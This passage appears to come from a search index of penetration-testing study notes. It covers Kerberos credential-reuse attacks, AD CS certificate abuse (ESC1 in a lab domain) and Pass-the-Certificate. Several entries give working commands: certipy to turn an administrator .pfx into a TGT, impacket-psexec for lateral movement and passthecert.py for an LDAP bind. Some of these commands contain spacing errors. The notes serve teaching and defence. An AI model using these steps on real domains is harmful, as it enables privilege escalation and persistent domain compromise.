OverPass-the-Hash | NT hash | KDC | Kerberos (RC4) | ✅ Yes | Pass-the-Key | Kerberos key | KDC | Kerberos (AES/RC4) | ✅ Yes | Pass-the-Ticket | Ticket | Target service | Kerberos | ❌ (already has) |"},{"id":"the-one-sentence-that-fixes-everything","u":"01_attacks-lateral-movement.html#the-one-sentence-that-fixes-everything","sec":"Attacks + Lateral Movement","lvl":3,"t":"6️⃣ The One Sentence That Fixes Everything","c":"Pass-the-Hash skips Kerberos entirely, OverPass-the-Hash converts an NT hash into a Kerberos key, and Pass-the-Key uses Kerberos keys directly — only the last two actually obtain a TGT."},{"id":"final-mental-model-memorize-this","u":"01_attacks-lateral-movement.html#final-mental-model-memorize-this","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 Final Mental Model (Memorize This)","c":"Hash ≠ Key ≠ Ticket NT hash → NTLM session (PtH) NT hash → Kerberos key → TGT (OPtH) Kerberos key → TGT (PtK) Ticket reuse (PtT)"},{"id":"pass-the-ticket","u":"01_attacks-lateral-movement.html#pass-the-ticket","sec":"Attacks + Lateral Movement","lvl":2,"t":"Pass The Ticket","c":""},{"id":"understanding-the-core-concept-2","u":"01_attacks-lateral-movement.html#understanding-the-core-concept-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"pass-the-ticket-ptt","u":"01_attacks-lateral-movement.html#pass-the-ticket-ptt","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ Pass-the-Ticket (PtT)","c":"🔹 What It Is Reusing a valid Kerberos ticket (TGT or TGS) without knowing the password or hash You are not authenticating again — you are presenting an already issued identity ."},{"id":"what-material-is-used","u":"01_attacks-lateral-movement.html#what-material-is-used","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 What Material Is Used","c":""},{"id":"kerberos-tickets","u":"01_attacks-lateral-movement.html#kerberos-tickets","sec":"Attacks + Lateral Movement","lvl":4,"t":"Kerberos tickets","c":"TGT (Ticket Granting Ticket) or TGS (Service ticket) Stored in: LSASS memory Kerberos cache"},{"id":"where-it-lives-in-the-flow-2","u":"01_attacks-lateral-movement.html#where-it-lives-in-the-flow-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Where It Lives in the Flow","c":"Authorization phase , not authentication. Ticket already issued → Present ticket →Server validates signature → PAC →access token No password check No hash check No KDC interaction (for TGS reuse)"},{"id":"why-it-works","u":"01_attacks-lateral-movement.html#why-it-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Why It Works","c":"Kerberos trusts: Ticket signature Ticket lifetime Ticket PAC contents If valid: “I don’t care how you got it”"},{"id":"what-you-can-do-with-ptt","u":"01_attacks-lateral-movement.html#what-you-can-do-with-ptt","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 What You Can Do With PtT","c":"Ticket Type | Result | — | — | TGT | Request any TGS | TGS | Access specific service | Golden Ticket | Full domain | Silver Ticket | Specific service |"},{"id":"limitations-1","u":"01_attacks-lateral-movement.html#limitations-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔹 Limitations","c":"Ticket expires KRBTGT reset invalidates TGTs Service account reset invalidates TGSs Tied to domain trust boundaries"},{"id":"one-line-truth-2","u":"01_attacks-lateral-movement.html#one-line-truth-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔑 One-line truth","c":"Pass-the-Ticket = reuse identity, skip authentication entirely"},{"id":"pass-the-certificate","u":"01_attacks-lateral-movement.html#pass-the-certificate","sec":"Attacks + Lateral Movement","lvl":2,"t":"Pass The Certificate","c":"https://specterops.io/blog/2021/06/17/certified-pre-owned/"},{"id":"understanding-the-basic-terms","u":"01_attacks-lateral-movement.html#understanding-the-basic-terms","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Basic Terms","c":""},{"id":"what-is-ad-cs-active-directory-certificate-services","u":"01_attacks-lateral-movement.html#what-is-ad-cs-active-directory-certificate-services","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ What is AD CS (Active Directory Certificate Services)?","c":"Active Directory Certificate Services (AD CS) is a Windows Server role for issuing and managing public key infrastructure (PKI) certificates used in secure communication and authentication protocols. AD CS is a Windows Server feature that helps a company create and manage digital certificates . These certificates are like digital ID cards for users, computers, or services. AD CS is used to: Prove someone’s identity (authentication) Secure communication (encryption) Digitally sign files, emails, or code (signing)"},{"id":"how-ad-cs-helps-in-an-organization","u":"01_attacks-lateral-movement.html#how-ad-cs-helps-in-an-organization","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧰 How AD CS Helps in an Organization","c":"AD CS enables: Authentication using certificates instead of passwords. Secure email , using S/MIME. Document and code signing to verify integrity and origin. SSL/TLS encryption for web servers. Smart card logon for users. VPN and Wi-Fi access with certificate-based authentication. Secure communication between clients, services, and servers."},{"id":"what-is-a-ca-certificate-authority","u":"01_attacks-lateral-movement.html#what-is-a-ca-certificate-authority","sec":"Attacks + Lateral Movement","lvl":4,"t":"🏢 What is a CA (Certificate Authority)?","c":"A Certificate Authority (CA) is the main part of AD CS . Think of it like a passport office in your organization. You go to the CA (certificate office), Show who you are (username, computer name, etc.), If trusted, it issues you a digital certificate . That certificate says: “This user or computer is real and trusted. Signed — your CA.” So, the CA is the trusted center that gives out (issues) certificates to people or machines."},{"id":"public-key-infrastructure-pki-the-foundation","u":"01_attacks-lateral-movement.html#public-key-infrastructure-pki-the-foundation","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Public Key Infrastructure (PKI) – The Foundation","c":"PKI is the framework of policies, hardware, software, and standards needed to manage public/private key pairs and digital certificates. PKI uses: Public keys for encryption and signature verification. Private keys (kept secret) for decryption and signing. A Certificate Authority (CA) to bind public keys to identities via certificates."},{"id":"public-key-infrastructure-pki-the-foundation-1","u":"01_attacks-lateral-movement.html#public-key-infrastructure-pki-the-foundation-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Public Key Infrastructure (PKI) – The Foundation","c":"PKI is the framework of policies, hardware, software, and standards needed to manage public/private key pairs and digital certificates. PKI uses: Public keys for encryption and signature verification. Private keys (kept secret) for decryption and signing. A Certificate Authority (CA) to bind public keys to identities via certificates."},{"id":"key-components-of-ad-cs-and-pki","u":"01_attacks-lateral-movement.html#key-components-of-ad-cs-and-pki","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧱 Key Components of AD CS and PKI","c":""},{"id":"key-components","u":"01_attacks-lateral-movement.html#key-components","sec":"Attacks + Lateral Movement","lvl":4,"t":"✳️ Key Components:","c":"Certification Authority (CA) : The server role (Enterprise CA) that issues and signs certificates. Certificate : A digital identity for a user or computer, containing the public key and metadata (subject, EKUs, etc.). CSR (Certificate Signing Request) : A request generated by a client, containing the public key and identity info, sent to the CA for certificate issuance. Certificate Template : Predefined settings that define what a certificate will be used for, who can enroll, required approvals, etc. EKU OIDs (Extended Key Usages): Define the purpose of a certificate (e.g., Smart Card Logon, Client Authentication, Code Signing)."},{"id":"what-is-a-ca-certificate","u":"01_attacks-lateral-movement.html#what-is-a-ca-certificate","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧾 What is a CA Certificate ?","c":"The CA certificate is: A special certificate that belongs to the CA itself . It proves that the CA is trusted . Other computers trust this CA certificate so they will trust all certificates issued by it . The CA’s certificate includes its public key and identity, and it is trusted by the entire domain (or forest) . Certificates issued by this CA can then be used to prove identity , encrypt communications , or sign data . In an Active Directory (AD) environment, the AD Certificate Services (AD CS) role allows you to deploy your own enterprise CA , issuing certificates to users and devices. 📌 Example: If your organization has a CA named Corp-CA , then every user or device that trusts the Corp-CA certificate will also trust any certificate issued by it — like certificates given to users for login, or to websites for HTTPS."},{"id":"who-issues-certificates","u":"01_attacks-lateral-movement.html#who-issues-certificates","sec":"Attacks + Lateral Movement","lvl":4,"t":"🛠️ Who issues certificates?","c":"The CA issues certificates to: Users – for smart card or certificate-based logon Computers – to prove their identity to the network Web Servers – for secure HTTPS Apps – for code signing or secure communication It uses certificate templates to define how the certificate should be built, like: What the certificate can be used for (login, email, etc.) How long it is valid Who is allowed to request it"},{"id":"concept-how-a-certificate-is-issued-and-used-for-authentication","u":"01_attacks-lateral-movement.html#concept-how-a-certificate-is-issued-and-used-for-authentication","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔐 Concept: How a Certificate is Issued and Used for Authentication","c":"image.png"},{"id":"certificate-enrollment-process-steps-15","u":"01_attacks-lateral-movement.html#certificate-enrollment-process-steps-15","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔢 Certificate Enrollment Process (Steps 1–5)","c":"1. Client Generates Public/Private Key Pair The user’s machine (or the user themself) generates a key pair . The private key stays local (e.g., in TPM or certificate store). The public key will be embedded in a certificate request (CSR) . 2. Client Sends Certificate Signing Request (CSR) to Enterprise CA The CSR includes: The user/computer’s identity (Subject: CORP\\user ) Requested certificate template (e.g., “CodeSign”) Public Key EKUs (like Code Signing, Client Authentication, Smart Card Logon, etc.) 3. Enterprise CA Validates Request The CA checks: ✅ Does the template exist? ✅ Does the template allow the requested EKUs (via OID)? ✅ Is the user authorized to enroll using this template? ✅ Does the request require manual approval? 4. CA Signs and Issues the Certificate If valid, the CA issues a certificate by: Binding the public key to the user’s identity. Signing it with the CA’s private key (proving trust). The certificate now includes: Subject, Public Key, EKUs, CA Signature. Note:- If you compromise CA then you can decrypt all the certificated sign by it. 5. Certificate Installed on Client The client stores the issued certificate in the Windows Certificate Store . The user can now use the certificate for actions like: Logging in (if EKU = Smart Card Logon / Client Auth) Signing code/documents (if EKU = Code Signing) TLS client authentication, Wi-Fi/EAP-TLS, VPN"},{"id":"example-scenario","u":"01_attacks-lateral-movement.html#example-scenario","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔁 Example Scenario:","c":"Let’s say you want to log in to your office computer without typing your password : You request a certificate from the CA (using your username). The CA checks your identity (through Active Directory). If allowed, it gives you a certificate . That certificate is stored on your computer or smart card. When you log in, your computer shows the certificate to the server. The server trusts the certificate because it was signed by the CA. You’re logged in — securely — without needing a password."},{"id":"how-this-certificate-is-used-in-kerberos-authentication","u":"01_attacks-lateral-movement.html#how-this-certificate-is-used-in-kerberos-authentication","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 How This Certificate is Used in Kerberos Authentication","c":"Now that the user has a certificate (e.g., with Client Authentication or Smart Card Logon EKU ), it can be used during logon via PKINIT . 🔁 Certificate-Based Kerberos Logon Flow (PKINIT) The user logs in using their certificate (e.g., smart card, TPM). The system sends an AS-REQ to the KDC (Domain Controller). Instead of password pre-auth (timestamp encrypted with NT hash), It uses the certificate + digital signature (proof of possession of private key). The KDC: Checks if the certificate is valid and trusted (i.e., issued by an AD CS CA). Checks the EKU (Smart Card Logon or Client Auth). If all is valid, issues a TGT (Ticket Granting Ticket) . From there, the normal Kerberos process resumes: The user can now request TGS tickets for services (e.g., CIFS , HTTP , etc.) TGT → TGS (Service Ticket) → Access to services ✅ Same Kerberos flow , but different way to prove identity ."},{"id":"important-notes","u":"01_attacks-lateral-movement.html#important-notes","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Important Notes","c":"Certificates don’t replace TGTs — they only replace how you prove your identity in the initial AS-REQ . The rest of the Kerberos flow (TGT ➝ TGS ➝ service) remains unchanged. This is typically used in Smart Card Logon , EAP-TLS Wi-Fi , or VPN auth scenarios. The cert must have the correct EKUs (e.g., Smart Card Logon , Client Authentication )."},{"id":"kerberos-authentication-traditional-vs.-certificate-based","u":"01_attacks-lateral-movement.html#kerberos-authentication-traditional-vs.-certificate-based","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Kerberos Authentication – Traditional vs. Certificate-Based","c":"Aspect | Traditional Kerberos | Certificate-Based Kerberos (PKINIT) | — | — | — | Identity Proof | User provides username + password | User provides certificate + digital signature | Key Used | Derived from password (NT hash) | Private key corresponding to issued certificate | Pre-authentication | Timestamp encrypted with password hash | Certificate-based signature in AS-REQ | Protocol Extension | Native Kerberos | PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) | Credentials Issued | TGT (Ticket Granting Ticket) | TGT (same, but identity proven via cert) | Usable EKU | Not applicable | Must include Smart Card Logon or Client Authentication |"},{"id":"real-world-scenario-certificate-based-logon-across-forests","u":"01_attacks-lateral-movement.html#real-world-scenario-certificate-based-logon-across-forests","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Real-World Scenario: Certificate-Based Logon Across Forests","c":"Situation: An organization has two Active Directory forests: Forest A (CORP.LOCAL) – user’s home forest Forest B (SERVICES.LOCAL) – resources (e.g., file server) reside here These forests have a cross-forest trust (two-way forest trust), and both forests have Enterprise CAs via AD CS."},{"id":"scenario-steps-end-to-end","u":"01_attacks-lateral-movement.html#scenario-steps-end-to-end","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ Scenario Steps (End-to-End):","c":"🔐 User Logon with Certificate (in CORP.LOCAL) The user logs in using a smart card or certificate (issued by the CORP.LOCAL CA ). The client sends a PKINIT-based AS-REQ to its local DC. The CORP.LOCAL KDC verifies the certificate (trusts its own CA) and issues a TGT . 🎫 Request TGS for Remote Service (in SERVICES.LOCAL) The user wants to access \\\\fileserver.services.local (hosted in the second forest). The user presents their TGT to the KDC in CORP.LOCAL and asks for a TGS for SERVICES.LOCAL via the trust. 🔁 Cross-Forest Referral CORP.LOCAL KDC refers the user to SERVICES.LOCAL via the trust. The user now contacts the KDC in SERVICES.LOCAL , presenting a referral TGT . 🆗 TGS Issued in SERVICES.LOCAL SERVICES.LOCAL KDC trusts CORP.LOCAL due to the forest trust. It checks the referral TGT and issues a TGS for the CIFS service on the file server. 📂 Access Granted The user presents the TGS to the file server. Access is granted based on group membership and ACLs . ✅ Even though the user authenticated via certificate in their own forest , thanks to: AD CS issuing valid certificates PKINIT support"},{"id":"cross-forest-kerberos-trust","u":"01_attacks-lateral-movement.html#cross-forest-kerberos-trust","sec":"Attacks + Lateral Movement","lvl":4,"t":"Cross-forest Kerberos trust","c":"they were able to access a service in a different forest."},{"id":"how-ad-cs-enables-this","u":"01_attacks-lateral-movement.html#how-ad-cs-enables-this","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 How AD CS Enables This","c":"AD CS issues the user certificate with required EKUs (e.g., Smart Card Logon). The certificate is trusted within CORP.LOCAL , and through cross-certification or forest trust , it can also be validated in SERVICES.LOCAL . KDCs in both forests are configured to accept PKINIT requests ."},{"id":"conceptual-advantages-explained","u":"01_attacks-lateral-movement.html#conceptual-advantages-explained","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Conceptual Advantages Explained:","c":"Stronger Security Model Certificates use asymmetric cryptography : public/private key pairs. The private key never leaves the client device (e.g., smart card, TPM). This makes it extremely hard to steal credentials — unlike passwords which can be dumped or reused. 2. Phishing & Replay Attack Resistance No password is entered or transmitted. Even if someone tricks you into connecting to a fake service, your private key can’t be extracted , and signatures can’t be reused . Compliance & MFA Support Certificate logon can be combined with: Smart cards Biometrics (Windows Hello for Business) Hardware TPM Helps organizations meet compliance requirements (e.g., for finance, healthcare, defense). Granular Control via AD CS You can configure: Which users/devices get which certificates What purposes the certs can be used for (via EKUs) Certificate expiration & auto-renewal Revocation lists (CRL) This gives more control than traditional password policies (which are often poorly enforced). No Credential Leakage Over the Network Traditional Kerberos still uses password-derived secrets for the initial AS-REQ pre-auth (even if the TGT/TGS are secure). Certificate-based authentication uses PKINIT , where identity is proven via digital signature , not password."},{"id":"example-real-scenario","u":"01_attacks-lateral-movement.html#example-real-scenario","sec":"Attacks + Lateral Movement","lvl":4,"t":"📌 Example: Real Scenario","c":"Password-Based Logon (Weakness) : User logs in to a phishing page that mimics the corporate login portal. The attacker captures their credentials. These can be reused, dumped from memory, or used in pass-the-hash attacks. Certificate-Based Logon (Strength) : User logs in using a smart card or TPM-stored certificate . Even if the attacker tricks them, the private key is never exposed , and the certificate can’t be reused by an attacker."},{"id":"summary-table-1","u":"01_attacks-lateral-movement.html#summary-table-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"📌 Summary Table","c":"Term | Description | — | — | AD CS | Role to manage PKI and certificates in Active Directory | CA | Issues and manages certificates | Certificate | Proves identity and enables encryption/signing | CSR | Request for certificate issuance | Certificate Template | Blueprint defining usage, permissions, key lengths, EKUs | EKU / OIDs | Define certificate purposes (e.g., logon, TLS) | PKI | System of trust for managing public/private keys and certs | Use Case | Wi-Fi auth, smart card login, VPN, TLS, email security |"},{"id":"why-ad-cs-is-dangerous-in-a-forest-with-domain-trusts","u":"01_attacks-lateral-movement.html#why-ad-cs-is-dangerous-in-a-forest-with-domain-trusts","sec":"Attacks + Lateral Movement","lvl":4,"t":"Why AD CS is Dangerous in a Forest with Domain Trusts","c":"Certificates issued by AD CS can be used instead of passwords for Kerberos/NTLM authentication. If an attacker compromises AD CS in one domain , they can issue trusted certificates for: Any user in that domain (including domain admins). Other domains in the same forest , due to implicit trust and shared PKI trust . This enables lateral movement and forest-wide compromise ."},{"id":"key-abuses-of-ad-cs","u":"01_attacks-lateral-movement.html#key-abuses-of-ad-cs","sec":"Attacks + Lateral Movement","lvl":4,"t":"Key Abuses of AD-CS","c":"1. Extract User and Machine Certificates If attacker gains access to a user/machine with an issued certificate, they can export: Private key from the certificate store. Use it to authenticate without needing passwords. Even if the password is reset later, certificate-based access remains valid until the cert expires/revoked → Persistence . Example: Attacker exports a workstation’s certificate and uses it to authenticate via RDP or LDAP, bypassing password policies. 2. Use Certificates to Retrieve NTLM Hash Certificates can be used for Kerberos PKINIT (smart card logon) . Once authenticated, attackers can: Request NTLM hashes from DC (via PKINIT-to-NTLM relay attacks). Perform NTLM relay attacks (e.g., against LDAP or LDAPS). Impact: This allows hash theft and relay attacks even when passwords are strong. 3. User and Machine Level Persistence Certificates = long-term authentication tokens . Even if a user changes their password, an attacker holding a valid certificate can still Log in, Access resources, Request Kerberos TGTs (via PKINIT) until certificate expires. Impact: Attacker maintains stealthy persistence in the environment without relying on password theft. 4. Escalation to Domain Admin & Enterprise Admin Misconfigured certificate templates can allow low-privileged users to: Request certificates for high-privilege accounts (ESC1/ESC2 attacks). Enroll as a domain controller certificate (ESC3). With a domain controller certificate: Attacker can perform DCSync (replicate NTDS.dit, extract all hashes). From one domain, they can: Abuse forest trust to move to the root domain. Become Enterprise Admin . 5. Domain Persistence Once attacker controls AD CS CA: They can issue any certificate for any identity in the forest . They can backdoor CA to silently issue new certs at will. Even if defenders reset passwords, rebuild servers, or remove malware: Attacker can re-enter via their rogue certs ."},{"id":"example-cross-domain-attack-path","u":"01_attacks-lateral-movement.html#example-cross-domain-attack-path","sec":"Attacks + Lateral Movement","lvl":4,"t":"Example Cross-Domain Attack Path","c":"Compromise low-privileged user in Child Domain . Abuse vulnerable certificate template (ESC1) to get a certificate for Domain Admin in child domain. Use that cert to: DCSync child domain. Extract trust keys to Parent/Root Domain . Forge inter-realm TGTs → access Forest Root Domain . Use AD CS in root to issue Enterprise Admin cert . Gain permanent forest-wide access ."},{"id":"why-this-is-critical","u":"01_attacks-lateral-movement.html#why-this-is-critical","sec":"Attacks + Lateral Movement","lvl":4,"t":"Why This Is Critical","c":"AD CS effectively turns Active Directory passwordless . If one CA or misconfigured template is compromised in any domain , the entire forest trust model collapses . Persistence is extremely hard to remove unless CA is fully rebuilt."},{"id":"how-user-gets-valid-certificate-and-tgt-from-it","u":"01_attacks-lateral-movement.html#how-user-gets-valid-certificate-and-tgt-from-it","sec":"Attacks + Lateral Movement","lvl":3,"t":"How User gets valid Certificate and TGT from it ??","c":""},{"id":"lab-scenario-concrete-setup","u":"01_attacks-lateral-movement.html#lab-scenario-concrete-setup","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧪 Lab Scenario (Concrete Setup)","c":"👤 User lowuser@corp.local Member of: Domain Users 🖥️ CA Server CA Name: corp-CA Type: Enterprise CA Published in AD: CN=corp-CA,CN=Enrollment Services,..."},{"id":"vulnerable-template-key-part","u":"01_attacks-lateral-movement.html#vulnerable-template-key-part","sec":"Attacks + Lateral Movement","lvl":4,"t":"📄 Vulnerable Template (Key Part)","c":"Template: VulnTemplate"},{"id":"configuration-this-is-what-matters","u":"01_attacks-lateral-movement.html#configuration-this-is-what-matters","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔧 Configuration (THIS is what matters)","c":"Setting | Value | Why it matters | — | — | — | Enrollment Rights | Domain Users | lowuser can request cert | msPKI-Certificate-Name-Flag | ENROLLEE_SUPPLIES_SUBJECT | user controls identity | EKU | Client Authentication | can be used for login | Manager Approval | Disabled | auto-issued | Authorized Signatures | 0 | no approval needed |"},{"id":"phase-1-certificate-request-with-settings","u":"01_attacks-lateral-movement.html#phase-1-certificate-request-with-settings","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 PHASE 1 — Certificate Request (WITH SETTINGS)","c":"🧩 Step 1: Key Pair Generation lowuser → generates public/private key (No ADCS setting involved here) 📩 Step 2: CSR Creation lowuser creates request: Template: VulnTemplate SAN: administrator@corp.local ← attacker-controlled Public Key: included 📤 Step 3: Send CSR to CA lowuser → corp-CA 🔍 Step 4: CA Evaluates Request (CRITICAL LOGIC) Now CA checks template settings: ✔️ Check 1: Enrollment Permission Template ACL: Domain Users → Enroll ✅ ✔️ lowuser allowed ✔️ Check 2: Subject Control msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT 👉 This allows: lowuser → request SAN = administrator@corp.local ❗ No validation of ownership ✔️ Check 3: Approval Requirement Manager Approval = Disabled Authorized Signatures = 0 👉 Certificate is auto-issued ✔️ Check 4: EKU EKU = Client Authentication 👉 Certificate can be used for login later ✍️ Step 5: CA Issues Certificate corp-CA → signs certificate Certificate now contains: Subject: (can be empty or arbitrary) SAN: administrator@corp.local 🔥 EKU: Client Authentication Issuer: corp-CA 📥 Step 6: lowuser Receives Certificate lowuser now has: Certificate (signed by CA) Private key"},{"id":"phase-2-certificate-validation-with-settings","u":"01_attacks-lateral-movement.html#phase-2-certificate-validation-with-settings","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 PHASE 2 — Certificate Validation (WITH SETTINGS)","c":"📩 Step 7: Use Certificate lowuser → presents certificate 🔍 Step 8: Trust Validation ✔️ Check CA Trust From AD: CN=NTAuthCertificates corp-CA present → trusted ✅ 🔏 Step 9: Signature Validation Certificate signed by corp-CA Verified using CA public key Valid signature ✅ ⏳ Step 10: Validity Check Not expired ✅ 🚫 Step 11: Revocation Check Not revoked ✅ 🧠 Step 12: Identity Mapping (CRITICAL) From certificate: SAN = administrator@corp.local System searches AD: userPrincipalName=administrator@corp.local ✔️ Match found → Administrator account 🔑 Step 13: EKU Check EKU = Client Authentication ✅ 🔐 Step 14: Private Key Proof lowuser proves possession of private key"},{"id":"final-result","u":"01_attacks-lateral-movement.html#final-result","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎟️ FINAL RESULT","c":"System accepts certificate as Administrator → TGT issued as Administrator"},{"id":"full-flow-with-settings-inline","u":"01_attacks-lateral-movement.html#full-flow-with-settings-inline","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 FULL FLOW (WITH SETTINGS INLINE)","c":"1. Template allows: - Domain Users enroll - ENROLLEE_SUPPLIES_SUBJECT - Client Authentication - No approval 2. lowuser sends CSR: SAN = administrator@corp.local 3. CA checks: → Permission ✅ → Subject allowed ✅ → No approval needed ✅ 4. CA signs cert: SAN = administrator@corp.local 5. Validation: → CA trusted ✅ → Signature valid ✅ → SAN maps to Administrator ✅ 6. Result: → lowuser becomes Administrator"},{"id":"why-each-setting-matters-quick-mapping","u":"01_attacks-lateral-movement.html#why-each-setting-matters-quick-mapping","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Why Each Setting Matters (Quick Mapping)","c":"Setting | Attack Impact | — | — | Enroll permission | Entry point | ENROLLEE_SUPPLIES_SUBJECT | Identity spoofing | Client Authentication EKU | Allows login | No approval | Immediate exploitation |"},{"id":"final-one-line-understanding","u":"01_attacks-lateral-movement.html#final-one-line-understanding","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Final One-Line Understanding","c":"If a template lets you control identity and get a client-auth cert, the CA will sign it and the system will trust it as that identity."},{"id":"pass-the-certificate-1","u":"01_attacks-lateral-movement.html#pass-the-certificate-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Pass The Certificate","c":""},{"id":"core-concept","u":"01_attacks-lateral-movement.html#core-concept","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 1. Core Concept","c":"Pass-the-Certificate (PtC) = using a certificate + private key to authenticate as a user without knowing their password."},{"id":"key-requirement-most-important","u":"01_attacks-lateral-movement.html#key-requirement-most-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 2. Key Requirement (MOST IMPORTANT)","c":"✔️ You MUST have: Certificate + Private Key"},{"id":"certificate-formats","u":"01_attacks-lateral-movement.html#certificate-formats","sec":"Attacks + Lateral Movement","lvl":4,"t":"📦 Certificate Formats","c":"Format | Contains | Usable for PtC? | — | — | — | .crt / .cer | Certificate only | ❌ No | .key | Private key only | ❌ No | .pem | Cert + Key (sometimes) | ✅ Yes | .pfx / .p12 | Cert + Private key + password | ✅ YES |"},{"id":"important-rule","u":"01_attacks-lateral-movement.html#important-rule","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Important Rule","c":"No Private Key = No Authentication"},{"id":"protocols-used-in-ptc","u":"01_attacks-lateral-movement.html#protocols-used-in-ptc","sec":"Attacks + Lateral Movement","lvl":4,"t":"🌐 3. Protocols Used in PtC","c":"🔐 A. Kerberos (PKINIT) Uses: Kerberos Purpose: Get TGT Flow: Certificate + Private Key → PKINIT → KDC → TGT 🔐 B. Schannel (TLS Authentication) Uses: TLS Purpose: LDAP / SMB authentication Flow: Certificate → TLS handshake → LDAP bind"},{"id":"prerequisites","u":"01_attacks-lateral-movement.html#prerequisites","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ 4. Prerequisites","c":"Environment: AD Domain (Windows Server 2016+ / 2019+) ADCS configured CA trusted in: CN=NTAuthCertificates Attacker Needs: .pfx file of target user (e.g., Administrator) OR: .crt + .key"},{"id":"how-attacker-gets-.pfx","u":"01_attacks-lateral-movement.html#how-attacker-gets-.pfx","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 5. How Attacker Gets .pfx","c":"🧪 Method 1: ADCS Abuse (ESC1) lowuser → requests cert as admin → gets admin.pfx 🧪 Method 2: Export from System certmgr.msc → export → .pfx (If exportable) 🧪 Method 3: DPAPI / Credential Dump Tools: Mimikatz Certipy"},{"id":"practical-example-full-attack-flow","u":"01_attacks-lateral-movement.html#practical-example-full-attack-flow","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 6. Practical Example (Full Attack Flow)","c":"🎯 Scenario You have: administrator.pfx Password: Pass@123 Domain: corp.local DC: 10.10.10.10"},{"id":"step-1-extract-certificate-key-optional","u":"01_attacks-lateral-movement.html#step-1-extract-certificate-key-optional","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧪 Step 1: Extract Certificate & Key (Optional)","c":"certipy-ad cert-pfx administrator.pfx -nokey-out admin.crt certipy-ad cert-pfx administrator.pfx -nocert-out admin.key 👉 Only needed for tools like passthecert.py"},{"id":"step-2-use-pkinit-to-get-tgt","u":"01_attacks-lateral-movement.html#step-2-use-pkinit-to-get-tgt","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧪 Step 2: Use PKINIT to Get TGT","c":"Using Certipy: certipy-ad auth-pfx administrator.pfx -dc-ip 10.10.10.10 🔍 What Happens Internally: 1. Certificate sent to KDC 2. KDC validates: - CA trust - Signature - SAN → administrator 3. TGT issued 🎟️ Output: [*] Got TGT for administrator [*] Saved credential cache"},{"id":"step-3-use-tgt-lateral-movement","u":"01_attacks-lateral-movement.html#step-3-use-tgt-lateral-movement","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧪 Step 3: Use TGT (Lateral Movement)","c":"Example: impacket-psexec corp.local/administrator@10.10.10.10-k-no-pass"},{"id":"step-4-schannel-authentication-ldap","u":"01_attacks-lateral-movement.html#step-4-schannel-authentication-ldap","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧪 Step 4: Schannel Authentication (LDAP)","c":"Using passthecert: python3 passthecert.py \\ -crt admin.crt \\ -key admin.key \\ -dc-ip10.10.10.10 \\ -domain corp.local 🔍 What Happens: 1. TLS handshake 2. Certificate presented 3. LDAP bind as Administrator"},{"id":"why-ptc-is-dangerous","u":"01_attacks-lateral-movement.html#why-ptc-is-dangerous","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 7. Why PtC is Dangerous","c":"❌ Bypasses: Passwords MFA (in many cases) Account lockout ⏳ Persistence: Cert valid for months/years 🕵️ Stealth: No password logs Looks like legitimate cert auth"},{"id":"relation-to-other-attacks","u":"01_attacks-lateral-movement.html#relation-to-other-attacks","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔗 8. Relation to Other Attacks","c":"Attack | Credential Used | — | — | Pass-the-Hash | NTLM hash | Pass-the-Ticket | Kerberos ticket | Pass-the-Certificate | Cert + Private key |"},{"id":"critical-understanding","u":"01_attacks-lateral-movement.html#critical-understanding","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 9. Critical Understanding","c":"System does NOT check: \"Who requested the cert?\" It only checks: \"Is this cert valid and trusted?\""},{"id":"final-flow-one-view","u":"01_attacks-lateral-movement.html#final-flow-one-view","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Final Flow (One View)","c":"[GET CERT] lowuser → ADCS → administrator.pfx [USE CERT] administrator.pfx → PKINIT → TGT [ACCESS] TGT → service access (psexec / smb / ldap)"},{"id":"final-one-line-summary","u":"01_attacks-lateral-movement.html#final-one-line-summary","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ 